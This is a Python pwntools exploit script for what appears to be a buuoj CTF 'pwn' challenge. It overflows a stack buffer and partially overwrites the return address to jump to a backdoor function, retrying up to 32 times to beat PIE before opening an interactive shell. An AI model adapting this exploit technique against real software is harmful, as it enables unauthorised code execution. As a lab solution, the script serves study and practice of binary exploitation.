'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
'''

from pwn import *
# from LibcSearcher import *


local = 1
url, port = "node5.buuoj.cn", "29425" 
filename = "./pwn"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    # io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    # io = remote(url, port)
    pass

'''
push rbp
mov rbp, rsp

ret_addr hijack to 0x126C to bypass the assembly above
otherwise, assembly will change the rsp and rbp registers value
leading to exploiting failure
'''

# notice that 0x1264 can not work
backdoor_addr = 0x126C # 0x1268 | 0x126C
appending_size = 0x20 + 8
appending_str = cyclic(appending_size)

def B(io):
    gdb.attach(io)
    pause()

def pwn():
    cnt = 32
    while (cnt > 0):
        cnt -= 1
        try:
            io = process(filename) if local else remote(url, port)
            payload = appending_str + p16(backdoor_addr)
            # B(io)
            io.sendlineafter(b'A nice try to break pie!!!\n', payload)
            io.interactive()
        except:
            io.close()


if __name__ == "__main__":
    pwn()
    